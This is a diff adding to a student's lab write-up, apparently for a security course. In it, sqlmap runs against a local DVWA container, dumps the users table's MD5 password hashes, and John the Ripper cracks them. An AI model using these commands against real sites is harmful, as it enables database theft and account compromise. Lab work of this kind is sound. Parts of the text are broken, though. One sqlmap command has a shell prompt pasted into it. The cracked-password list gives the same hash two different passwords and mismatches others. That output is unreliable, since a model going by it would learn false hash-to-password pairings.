@@ -1,4 +1,4 @@
-# Lab #1
+![image](https://github.com/user-attachments/assets/4bcbe88a-4d8a-486b-81d3-753c899bbf69)# Lab #1
 ## Task 1: Software buffer overflow attack
 
 ### 1. Compile asm program and C program to executable code:
@@ -137,3 +137,81 @@ cat /etc/hosts
 ```
 
 ![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/3.png)
+
+## Task 2: Attack on the database of Vulnerable App from SQLi lab
+
+### 1. Use sqlmap to get information about all available databases
+
+#### Step 1: Start docker and set up sqlmap
+
+```sh
+# Ensure Docker is running before running the commands
+docker pull vulnerables/web-dvwa
+docker run -d -p 80:80 vulnerables/web-dvwa
+```
+
+We then open http://localhost to access the DVWA site
+
+Next, we can install sqlmap here: https://github.com/sqlmapproject/sqlmap?tab=readme-ov-file#installation. I downloaded the latest zipball.
+
+#### Step 2: Identify vulnerable point and run sqlmap
+
+We log in using the default username `admin` and password `password`. Then, we go to the SQL Injection page `http://localhost/vulnerabilities/sqli/`, where we input `1` and press submit, which gives the vulnerable url `http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit`. 
+Next, we check the cookies of the site. I used a cookie editor for this:
+![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/4.png)
+
+With the cookies `security=low` and `PHPSESSID=sqk0l27imcclp1u9d13s1sc444`, we will use sqlmap to exploit this vulnerability. In my case, I opened a command prompt in the sqlmap folder and ran:
+```sh
+python sqlmap.py sqlmapproject-sqlmap-1.8.9-1-g9e36fd7\sqlmapproject-sqlmap-9e36fd7>python sqlmap.py sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sqk0l27imcclp1u9d13s1sc444" --dbs`
+```
+![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/5.png)
+![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/6.png)
+
+Here, we can see that the available databases are `dvwa` and `information_schema`.
+
+### 2. Use sqlmap to get tables, users information
+
+#### Step 1: Extract tables
+
+```sh
+python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sqk0l27imcclp1u9d13s1sc444" -D dvwa --tables
+```
+![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/7.png)
+
+We can see that there are two tables, `guestbook` and `users`
+
+#### Step 2: Extract users information
+
+```sh
+python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sqk0l27imcclp1u9d13s1sc444" -D dvwa -T users --dump
+```
+![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/8.png)
+```sql
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2024-10-22 14:34:09 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2024-10-22 14:34:09 | 0            |
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2024-10-22 14:34:09 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2024-10-22 14:34:09 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2024-10-22 14:34:09 | 0            |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+```
+The password hashes seem to be in an MD5 format.
+
+### 3. Make use of John the Ripper to disclose the password of all database users from the above exploit
+
+First, we can install John The Ripper from the site https://www.openwall.com/john/. I downloaded this specific version: https://www.openwall.com/john/k/john-1.9.0-jumbo-1-win64.7z.
+Next, we'll compile all of the hashed passwords we extracted in the previous section into a hashedpw.txt file and run John The Ripper on it. 
+```sh
+john --format=raw-md5 hashedpw.txt
+```
+![image](https://raw.githubusercontent.com/ByrnorOCount/Subs/refs/heads/main/9.png)
+And we've obtained the raw passwords:
+```
+5f4dcc3b5aa765d61d8327deb882cf99 = password
+e99a18c428cb38d5f260853678922e03 = password
+8d3533d75ae2c3966d7e0d4fcc69216b = abc123
+0d107d09f5bbe40cade3de5c71e9e9b7 = letmein
+5f4dcc3b5aa765d61d8327deb882cf99 = charley
+```
